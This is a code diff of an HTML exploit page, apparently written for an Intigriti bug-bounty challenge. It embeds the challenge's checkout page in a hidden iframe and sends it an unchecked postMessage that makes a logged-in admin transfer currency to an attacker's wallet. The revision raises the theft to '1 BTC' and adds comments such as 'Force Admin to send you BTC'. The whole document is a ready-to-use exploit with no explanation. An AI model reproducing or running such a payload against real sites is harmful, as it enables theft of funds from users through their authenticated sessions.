@@ -1,33 +1,24 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Coin Stealer</title>
-</head>
+<html>
 <body>
-    <iframe id="targetFrame" src="https://challenge-0126.intigriti.io/checkout.html" style="opacity:0;width:0;height:0;"></iframe>
-
+    <iframe id="f" src="https://challenge-0126.intigriti.io/checkout.html" style="opacity:0"></iframe>
     <script>
-        // REPLACE THIS WITH YOUR WALLET ADDRESS
-        const YOUR_WALLET = "1f4eb50b5dd8445bd28502edceac448763"; 
+        // REPLACE WITH YOUR **BTC** WALLET ADDRESS
+        const YOUR_BTC_WALLET = "1855baf2107b6439be06127dcae8600e69"; 
 
-        const frame = document.getElementById('targetFrame');
-
-        // 2. Wait for the frame to load the Admin's session
-        frame.onload = function() {
+        document.getElementById('f').onload = () => {
             setTimeout(() => {
-                // 3. Send the command to transfer 1337COIN to YOU
-                frame.contentWindow.postMessage({
+                // Force Admin to send you BTC
+                document.getElementById('f').contentWindow.postMessage({
                     type: 'submitTransaction',
                     transaction: {
-                        currency: '1337COIN', // The Admin has this currency
-                        amount: 1337,         // Amount to steal
-                        toAddress: YOUR_WALLET
+                        currency: 'BTC',   // Admin HAS this!
+                        amount: 1,         // Steal 1 BTC
+                        toAddress: YOUR_BTC_WALLET
                     }
-                }, '*'); // Vulnerability: No origin check on target
-            }, 2000); // Wait 2s to ensure the page is ready
+                }, '*');
+            }, 2000);
         };
     </script>
-    <h2>Claiming your coins...</h2>
 </body>
 </html>
